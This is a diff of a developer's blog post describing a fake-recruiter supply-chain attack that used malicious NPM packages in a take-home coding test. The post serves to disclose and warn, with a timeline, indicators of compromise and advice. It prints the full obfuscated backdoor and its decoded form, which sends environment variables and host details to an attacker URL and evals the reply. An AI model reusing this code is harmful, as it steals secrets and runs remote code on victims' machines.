@@ -3,30 +3,66 @@ title: I Was Targeted by a Fake Employer Running a Real NPM Supply Chain Attack
 author: Toufiqur Rahaman Chowdhury
 published: 2025-07-25
 updated: 2025-07-31
-tags: [npm, supply-chain, infosec, social-engineering, malware, linkedin, recruitment, nodejs]
+tags:
+  [
+    npm,
+    supply-chain,
+    infosec,
+    social-engineering,
+    malware,
+    linkedin,
+    recruitment,
+    nodejs,
+  ]
 canonical_url: https://github.com/alien45/journal/2025-07-25-targeted-dev-attack/README.md
 ---
 
-<h2 style="border: none">
+<h1 class="page-title">
 I Was Targeted by a Fake Employer Running a Real NPM Supply Chain Attack
+</h1>
+
+<h2 class="page-subtitle">
+  A journey through the rabbit-hole of backdoors and digital deception
 </h2>
 
-<h3 style="border: none; margin-top: 0.4em; font-style: italic; font-weight: normal; color: #555;">
-  A journey through the rabbit-hole of backdoors and digital deception
-</h3>
-
-*Author: [Toufiqur Rahaman Chowdhury](https://alien45.github.io/cv)* • Published: 2025-07-25 • [← Back to Journal Home](../)
+_Author: [Toufiqur Rahaman Chowdhury](https://alien45.github.io/cv)_
+• Published: 2025-07-25
+• [← Back to Journal Home](../)
 
 ---
 
-### 📅 Timeline of Events
+## Table of Contents
 
-**June 25, 2025**  
+- [Timeline of Events](#timeline-of-events)
+  - [June 25, 2025](#june-25-2025)
+  - [June 26, 2025](#june-26-2025)
+  - [June 27, 2025](#june-27-2025)
+  - [July 3, 2025](#july-3-2025)
+  - [July 4, 2025](#july-4-2025)
+  - [July 10-24, 2025](#july-10-24-2025)
+- [Dissecting `async-queuelite`: A Real Backdoor](#dissecting-async-queuelite-a-real-backdoor)
+  - [Breakdown: How the Backdoor Works](#breakdown-how-the-backdoor-works)
+  - [The Stealth Backdoor](#the-stealth-backdoor)
+- [Social Engineering: The Fake LinkedIn Profile](#social-engineering-the-fake-linkedin-profile)
+- [Could the Slack Group Have Been Connected?](#could-the-slack-group-have-been-connected)
+- [Why This Was Clearly Targeted](#why-this-was-clearly-targeted)
+- [What I Did Right](#what-i-did-right)
+- [What Could Have Gone Wrong](#what-could-have-gone-wrong)
+- [Indicators of Compromise (IOC)](#indicators-of-compromise-ioc)
+- [Lessons for Developers](#lessons-for-developers)
+- [Final Thoughts](#final-thoughts)
+- [About the Author](#about-the-author)
+
+## Timeline of Events
+
+### June 25, 2025
+
 Earlier in the week, I applied to a few developer roles online. I received an email from one of the employers who directed me to a Slack group that appeared to have been created on June 19, 2025, based on the creation date of its only two channels. The person claimed they had created this group to build a community to post jobs and connect developers with opportunities. I joined and noticed a lot of other candidates also joined the group (so far 300+ at the time of writing this). I introduced myself and had a brief conversation with other candidates, during which I casually mentioned a previous LinkedIn-based social engineering attempt that I had encountered.
 
-**June 26, 2025**  
+### June 26, 2025
+
 A LinkedIn user named Michael McCarthy, a CEO and Angel Investor from Canada, claiming to be an employer messaged me with an opportunity for a full-stack developer role.
- 
+
 <figure>
   <img
     alt="Figure 1: Linkedin email notifying new message received from the fake employer, Michael McCarthy"
@@ -36,8 +72,7 @@ A LinkedIn user named Michael McCarthy, a CEO and Angel Investor from Canada, cl
   <figcaption>Figure 1: Linkedin email notifying new message received from the fake employer, Michael McCarthy</figcaption>
 </figure>
 
-
-The role was well-aligned with my experience and most recent roles. 
+The role was well-aligned with my experience and most recent roles.
 
 <figure>
   <img 
@@ -46,7 +81,7 @@ The role was well-aligned with my experience and most recent roles.
     src="assets/linkedin-chat-1.png"
   />
   <figcaption>Figure 2: First LinkedIn message received from the fake employer</figcaption>
-</figure> 
+</figure>
 
 <figure>
   <img 
@@ -55,9 +90,9 @@ The role was well-aligned with my experience and most recent roles.
     src="assets/linkedin-chat-2.png"
   />
   <figcaption>Figure 3: fake employer explaining the job</figcaption>
-</figure> 
+</figure>
 
-They shared a link to a GitHub repo URL and asked me to complete a quick [coding test](assets/Test_Requirement.docx). The repo URL took me to a 404 (not found) page. 
+They shared a link to a GitHub repo URL and asked me to complete a quick [coding test](assets/Test_Requirement.docx). The repo URL took me to a 404 (not found) page.
 
 <figure>
   <img 
@@ -66,7 +101,7 @@ They shared a link to a GitHub repo URL and asked me to complete a quick [coding
     src="assets/linkedin-chat-3.png"
   />
   <figcaption>Figure 4: discussing the "meeting with HR"</figcaption>
-</figure> 
+</figure>
 
 <figure>
   <img 
@@ -75,7 +110,7 @@ They shared a link to a GitHub repo URL and asked me to complete a quick [coding
     src="assets/linkedin-chat-4.png"
   />
   <figcaption>Figure 5: calendly.com invite to schedule an interview and Google Docs link with the take home test description</figcaption>
-</figure> 
+</figure>
 
 <figure>
   <img 
@@ -84,7 +119,7 @@ They shared a link to a GitHub repo URL and asked me to complete a quick [coding
     src="assets/calendly.png"
   />
   <figcaption>Figure 6: Scheduling an interview at calendly.com</figcaption>
-</figure> 
+</figure>
 
 I initially presumed the GitHub project may have been private and required an invite for me to access it. When I asked, they provided a Bitbucket repository instead. Now I realize the account might have been deleted/suspended due to reporting by others or the malware being detected by GitHub.
 
@@ -95,28 +130,29 @@ I initially presumed the GitHub project may have been private and required an in
     src="assets/linkedin-chat-5.png"
   />
   <figcaption>Figure 7: After mentioning the dead GitHub repo URL fake employer provided a BitBucket repo URL</figcaption>
-</figure> 
+</figure>
 
-A few hours later, after cloning the Bitbucket repo, I attempted to install all the dependencies by running `npm install`, but the installation consistently got stuck during the initial loading stage (with a loading spinner). I presumed something might have been wrong with either my ISP’s DNS server and/or the connection with NPM servers.  
-  
+A few hours later, after cloning the Bitbucket repo, I attempted to install all the dependencies by running `npm install`, but the installation consistently got stuck during the initial loading stage (with a loading spinner). I presumed something might have been wrong with either my ISP’s DNS server and/or the connection with NPM servers.
+
 Then I tried using `yarn` and I encountered a broken dependency: `json-webhooks@1.5.9`. I discovered that the package had been removed and replaced with `0.0.1-security`, a standard NPM response to confirmed malicious packages that had been taken down.
-
 
 I never ran the code so I was safe. However, I had the plan to use a Docker container anyway to run it as a precautionary measure.
 
-**June 27, 2025**  
-The Bitbucket repository was suddenly deleted, and then *recreated with the exact same name and structure*, but this time using a new malicious package: `reqweaver`. I reported this to NPM, and within hours, the package was removed — nearly **92 hours after reporting** — and it was downloaded 51 times by other developers. However, I regretted not downloading the source code for investigation out of curiosity.
+### June 27, 2025
 
-**July 3, 2025**  
-The attacker repeated the tactic a third time, now using a new package named `async-queuelite`. This time, I downloaded the package for inspection. With the help of ChatGPT, I discovered a backdoor in the code which confirmed that this was a Supply Chain Attack. Details of the malicious code dissection are in the next section. I reported the `async-queuelite` package as well to NPM Support and it was taken down within 13 hours with zero downloads.  
-  
+The Bitbucket repository was suddenly deleted, and then _recreated with the exact same name and structure_, but this time using a new malicious package: `reqweaver`. I reported this to NPM, and within hours, the package was removed — nearly **92 hours after reporting** — and it was downloaded 51 times by other developers. However, I regretted not downloading the source code for investigation out of curiosity.
+
+### July 3, 2025
+
+The attacker repeated the tactic a third time, now using a new package named `async-queuelite`. This time, I downloaded the package for inspection. With the help of ChatGPT, I discovered a backdoor in the code which confirmed that this was a Supply Chain Attack. Details of the malicious code dissection are in the next section. I reported the `async-queuelite` package as well to NPM Support and it was taken down within 13 hours with zero downloads.
+
 After confirmation of the malicious code, I tried to read the conversation I had on LinkedIn with the fake employer. The conversation disappeared and the user also disappeared. I assumed they either deleted their profile or blocked me. While reviewing the first LinkedIn email notification from Michael McCarthy, I realized the LinkedIn messages from the attacker weren’t actually deleted, just hidden from the UI. Using the message link in my email, I was able to regain access to the conversation.
 
-**July 4, 2025**
+### July 4, 2025
 
 The attacker repeated the exact same tactic for the fourth time: by recreating the BitBucket repo and publishing a new NPM package named `restpilot`. I have downloaded the source code and found the exact same backdoor code. Once again, I reported it to NPM Support.
 
-**July 10-24, 2025**
+### July 10-24, 2025
 
 After repeated takedowns of their malicious NPM packages, the attacker pivoted: they began embedding the backdoor code directly into the test project itself, removing the dependency on NPM altogether. And they created a new repo called NovaX.
 
@@ -127,7 +163,7 @@ After repeated takedowns of their malicious NPM packages, the attacker pivoted: 
     src="assets/bitbucket-web3_space1.png"
   />
   <figcaption>Figure 8: Malicious repositories created by the attacker</figcaption>
-</figure> 
+</figure>
 
 <figure>
   <img 
@@ -138,13 +174,11 @@ After repeated takedowns of their malicious NPM packages, the attacker pivoted: 
   <figcaption>Figure 9: The two user IDs used to create the initial commit and update all the malicious repositories</figcaption>
 </figure>
 
-
 A few days ago, I have received an email job alert from [arc.dev](https://arc.dev) a job posting by Tirios, the same name the fake employer used. This appeared legit but I was more curious so I applied to the job. I was hoping to get a response before I publish the article. So far I haven't received any response. Either the fake employer is now using [arc.dev](https://arc.dev) to attract new victims or this is the real deal.
-
 
 ---
 
-### 🚨 Dissecting `async-queuelite`: A Real Backdoor
+## Dissecting `async-queuelite`: A Real Backdoor
 
 In the BitBucket repo, the `async-queuelite` package was only imported once in the `contracts/controllers/userController.js` and invoked the function only once at startup, but in the middle of the file like this:
 
@@ -168,24 +202,24 @@ The `async-queuelite@1.0.11` package disguised itself as a lightweight job queue
 Here is the malicious code in the NPM package (contents of the file `lib/writer.js`):
 
 ```javascript
-'use strict'
-const os = require('os')
-const pkg = require('../package.json')
+"use strict";
+const os = require("os");
+const pkg = require("../package.json");
 
-function getMacAddress () {
-  const interfaces = os.networkInterfaces()
-  const macAddresses = []
+function getMacAddress() {
+  const interfaces = os.networkInterfaces();
+  const macAddresses = [];
 
   for (const interfaceName in interfaces) {
-    const networkInterface = interfaces[interfaceName]
+    const networkInterface = interfaces[interfaceName];
 
     networkInterface.forEach((details) => {
-      if (details.family === 'IPv4' && !details.internal) {
-        macAddresses.push(details.mac)
+      if (details.family === "IPv4" && !details.internal) {
+        macAddresses.push(details.mac);
       }
-    })
+    });
   }
-  return macAddresses
+  return macAddresses;
 }
 const data = {
   ...process.env,
@@ -194,88 +228,108 @@ const data = {
   hostname: os.hostname(),
   username: os.userInfo().username,
   macAddresses: getMacAddress(),
+};
+
+function g(h) {
+  return h.replace(/../g, (match) => String.fromCharCode(parseInt(match, 16)));
 }
 
-function g (h) { return h.replace(/../g, match => String.fromCharCode(parseInt(match, 16))) }
-
 const hl = [
-  g('72657175697265'),
-  g('6178696f73'),
-  g('706f7374'),
-  g('68747470733A2F2F6C6F672D7365727665722D6C6F7661742E76657263656C2E6170702F6170692F6970636865636B2F373033'),
-  g('68656164657273'),
-  g('782d7365637265742d686561646572'),
-  g('736563726574'),
-  g('7468656e')
-]
+  g("72657175697265"),
+  g("6178696f73"),
+  g("706f7374"),
+  g(
+    "68747470733A2F2F6C6F672D7365727665722D6C6F7661742E76657263656C2E6170702F6170692F6970636865636B2F373033",
+  ),
+  g("68656164657273"),
+  g("782d7365637265742d686561646572"),
+  g("736563726574"),
+  g("7468656e"),
+];
 
-module.exports = (...args) => require(hl[1])[[hl[2]]](hl[3], data, { [hl[4]]: { [hl[5]]: hl[6] } })[[hl[7]]](r => eval(r.data)).catch(() => {})
+module.exports = (...args) =>
+  require(hl[1])
+    [[hl[2]]](hl[3], data, { [hl[4]]: { [hl[5]]: hl[6] } })
+    [[hl[7]]]((r) => eval(r.data))
+    .catch(() => {});
 ```
 
-#### Breakdown: How the Backdoor Works
+### Breakdown: How the Backdoor Works
 
 - Step 1: It collects sensitive host metadata and environment variables using the os module and process.env. Using the `os` module it extracts the user's MAC addresses, username etc, and using `process.env` gives them access to all the private information available to the NodeJS application.
+
 - Step 2: Obfuscate the attack. One clever piece of the attack was how it obscured the actual URL used for data exfiltration. Instead of hardcoding it, the code used obfuscated hex strings that are decoded at runtime using a function like this:
 
   ```javascript
-  function g (h) { return h.replace(/../g, match => String.fromCharCode(parseInt(match, 16))) }
+  function g(h) {
+    return h.replace(/../g, (match) =>
+      String.fromCharCode(parseInt(match, 16)),
+    );
+  }
   ```
-  
+
   Using this technique the attacker hides what is actually in the `hl` array.
 
   Here’s what the hl array resolves to when decoded:
+
   ```javascript
   const hl = [
-      // 0. g('72657175697265'):
-      'require',
-      // 1. g('6178696f73'):
-      'axios',
-      // 2. g('706f7374'):
-      'post',
-      // 3. g('68747470733A2F2F6C6FD7...702F6170692F6970636B2F373033'):
-      'https://log-server-lovat.vercel.app/api/ipcheck/703',
-      // 4. g('68656164657273'):
-      'headers',
-      // 5. g('782d7365637265742d686561646572'):
-      'x-secret-header',
-      // 6. g('736563726574'):
-      'secret',
-      // 7. g('7468656e'):
-      'then'
-  ]
+    // 0. g('72657175697265'):
+    "require",
+    // 1. g('6178696f73'):
+    "axios",
+    // 2. g('706f7374'):
+    "post",
+    // 3. g('68747470733A2F2F6C6FD7...702F6170692F6970636B2F373033'):
+    "https://log-server-lovat.vercel.app/api/ipcheck/703",
+    // 4. g('68656164657273'):
+    "headers",
+    // 5. g('782d7365637265742d686561646572'):
+    "x-secret-header",
+    // 6. g('736563726574'):
+    "secret",
+    // 7. g('7468656e'):
+    "then",
+  ];
   ```
-  Step 3: Now if we substitute the actual values from the hl array into the exported function, it becomes clear what the attacker is doing:
+
+- Step 3: Now if we substitute the actual values from the hl array into the exported function, it becomes clear what the attacker is doing:
 
   ```javascript
-  module.exports = (...args) => 
-  require('axios')['post'](
-    'https://log-server-lovat.vercel.app/api/ipcheck/703', 
-    data, 
-    { 'headers': { 'x-secret-header': 'secret' } }
-  )['then'](r => eval(r.data)).catch(() => {});
+  module.exports = (...args) =>
+    require("axios")
+      ["post"]("https://log-server-lovat.vercel.app/api/ipcheck/703", data, {
+        headers: { "x-secret-header": "secret" },
+      })
+      ["then"]((r) => eval(r.data))
+      .catch(() => {});
   ```
+
   We can see that first the `axios` package is imported which is a popular library for making HTTP requests. Then a `post` request is made the obfuscated URL `https://log-server-lovat.vercel.app/api/ipcheck/703` in `hl[3]`.
-  Step 4: Remote Code Execution.
+
+- Step 4: Remote Code Execution.
 
   The final part of the chain is the most dangerous. The attacker uses:
+
   ```javascript
     .then(r => eval(r.data))
   ```
+
   This means that whatever response the server sends back (r.data) will be evaluated and executed as JavaScript inside the victim’s Node.js environment.
 
   If the attacker returns a payload that installs malware, opens a reverse shell, or performs lateral movement, it will execute with the same permissions as the current process. This is a classic example of Remote Code Execution (RCE), and is especially dangerous because:
-  
   - It bypasses most static detection tools due to obfuscation.
   - It allows post-infection payloads to change over time. The attacker can now execute any code they control.
   - It executes code as part of what appears to be a legitimate module.
-  
+
   This is **full-blown remote code execution (RCE)**. The attacker could run arbitrary scripts, install malware, or open reverse shells.
 
+### The Stealth Backdoor
 
-#### The Stealth Backdoor
-The attacker now uses a more direct approach without NPM. They simply put the backdoor code inside the test project: [NovaX](https://bitbucket.org/web3_space/novax/src/main/). This appears to be an older tactic they used to use in other projects under the same username on BitBucket, which they seem to have recreated (deleted the project and recreate the same project with identical name and code to make it seem like it's a new project) and probably going to be using again. 
+The attacker now uses a more direct approach without NPM. They simply put the backdoor code inside the test project: [NovaX](https://bitbucket.org/web3_space/novax/src/main/). This appears to be an older tactic they used to use in other projects under the same username on BitBucket, which they seem to have recreated (deleted the project and recreate the same project with identical name and code to make it seem like it's a new project) and probably going to be using again.
 
 **File: auth/controllers/userController.js**
+
 ```javascript
 .....import packages
 require("dotenv").config({
@@ -295,13 +349,14 @@ exports.getCookie = asyncErrorHandler(async (req, res, next) => {
 ```
 
 **File: auth/config/.config.env**
+
 ```bash
 DEV_API_KEY="aHR0cHM6Ly9hcGkubnBvaW50LmlvLzE0ODk4NDcyOWUxMzg0Y2JlMjEy"
 DEV_SECRET_KEY="eC1zZWNyZXQta2V5"
 DEV_SECRET_VALUE="Xw=="
 ```
 
-**Summary of what changed:**
+#### Summary of what changed:
 
 - NPM dependency no longer used
 - Payload embedded directly in source
@@ -312,10 +367,9 @@ This tactic increases stealth: because the backdoor is no longer inside a publis
 
 While it does the same as NPM package backdoor with less obfuscation, it is still enough to fool unsuspecting and inexperienced programmers. I won’t go into the full breakdown again, as it mirrors the earlier backdoor closely.
 
-
 ---
 
-### 🔒 Social Engineering: The Fake LinkedIn Profile
+## Social Engineering: The Fake LinkedIn Profile
 
 The LinkedIn profile:
 
@@ -328,12 +382,12 @@ After I grew suspicious, the user appeared to have blocked me and deleted the en
 
 ---
 
-### 🧩 Could the Slack Group Have Been Connected?
+## Could the Slack Group Have Been Connected?
 
 While I can’t definitively say the Slack group was involved, it’s worth examining the timeline and possible connections:
 
 - **June 10, 2025**: I applied to the job related to the Slack Group.
-- **June 16, 2025**: The malicious `json-webhooks` package was published. It is, however, possible that this was not the first time and they may have other prior NPM packages published. 
+- **June 16, 2025**: The malicious `json-webhooks` package was published. It is, however, possible that this was not the first time and they may have other prior NPM packages published.
 - **June 19, 2025** The Slack group I joined appeared to be created.
 - **June 23, 2025**: Received invitation to join the Slack Group.
 - **June 26, 2025**: I received the attack via LinkedIn.
@@ -342,7 +396,7 @@ This raises a few possibilities:
 
 1. **It was an unrelated coincidence** — the timing just happened to align.
 2. **An attacker infiltrated the group posing as a candidate** — collecting contact info and monitoring conversations.
-3. **The group was part of the attacker’s infrastructure** — created to scout developers and test approaches.  
+3. **The group was part of the attacker’s infrastructure** — created to scout developers and test approaches.
 
 While I lean toward the attacker having some visibility or presence in that group, I’m not accusing anyone specifically. I still have to put my Dexter Morgan's forensic analyst hat on.
 
@@ -350,7 +404,7 @@ It’s possible the group is legitimate and simply compromised or observed witho
 
 ---
 
-### 🔎 Why This Was Clearly Targeted
+## Why This Was Clearly Targeted
 
 - The project closely mirrored my recent tech stack and interests.
 - The Job Description and the test repo were sufficiently detailed and just real enough to look convincing.
@@ -362,7 +416,7 @@ This wasn’t opportunistic. It was a carefully prepared **social engineering + 
 
 ---
 
-### ✅ What I Did Right
+## What I Did Right
 
 - **Didn’t run the code**, even initially.
 - Had a plan to run it in a Docker container.
@@ -373,16 +427,16 @@ This wasn’t opportunistic. It was a carefully prepared **social engineering + 
 
 ---
 
-### 🚫 What Could Have Gone Wrong
+## What Could Have Gone Wrong
 
-- Running the project, even in Docker, any environment variable passed to the container and anything in mounted volumes could've been leaked.  
+- Running the project, even in Docker, any environment variable passed to the container and anything in mounted volumes could've been leaked.
 - Even worse, if it had been run with the malicious NPM package, the hacker could have created a reverse shell and gained access to the computer.
 - If such code is deployed to staging/prod, it could compromise the CI/CD pipelines.
 - Trusting the fake employer, one may end up sharing credentials or dev access.
 
 ---
 
-### 🚧 Indicators of Compromise (IOC)
+## Indicators of Compromise (IOC)
 
 **Malicious NPM packages:**
 
@@ -403,7 +457,7 @@ I reported the last three packages (`reqweaver`, `async-queuelite`, and `restpil
 
 ---
 
-### 📊 Lessons for Developers
+## Lessons for Developers
 
 - **Don’t blindly install dependencies**, especially from unfamiliar repos.
 - **Always inspect small or unknown NPM packages**, especially if they're recently published.
@@ -416,7 +470,7 @@ I reported the last three packages (`reqweaver`, `async-queuelite`, and `restpil
 
 ---
 
-### ✉️ Final Thoughts
+## Final Thoughts
 
 Since this incident, I’ve also encountered another obfuscated malware sample distributed via UpWork. Maybe I'll try to cover that in a follow-up post.
 
@@ -428,15 +482,20 @@ Feel free to share this story. If it protects even one developer, it's worth it.
 
 ---
 
-*If you have seen any packages or messages similar to this incident, or if you'd like to collaborate on raising awareness, feel free to reach out.*
+_If you have seen any packages or messages similar to this incident, or if you'd like to collaborate on raising awareness, feel free to reach out._
 
 ---
 
-### 👤 About the Author
+## About the Author
 
 Toufiqur Rahaman Chowdhury is a full-stack software developer with over 8 years of experience building scalable web applications. He’s worked across frontend, backend, and blockchain systems.
 
-🔗 [← Back to Journal Home](../) • [CV](https://alien45.github.io/cv) • [LinkedIn](https://www.linkedin.com/in/toufiq/) • [GitHub](https://github.com/alien45) • [Contact / Hire Me](https://alien45.github.io/cv/Toufiqur_Chowdhury_CV.pdf)
-
+🔗 [← Back to Journal Home](../)
+• [CV](https://alien45.github.io/cv)
+• [LinkedIn](https://www.linkedin.com/in/toufiq/)
+• [GitHub](https://github.com/alien45)
+• [Contact / Hire Me](https://alien45.github.io/cv/Toufiqur_Chowdhury_CV.pdf)
 
 <link rel="stylesheet" href="../assets/style.css" />
+
+<script type="text/javascript" src="../assets/script.js"></script>
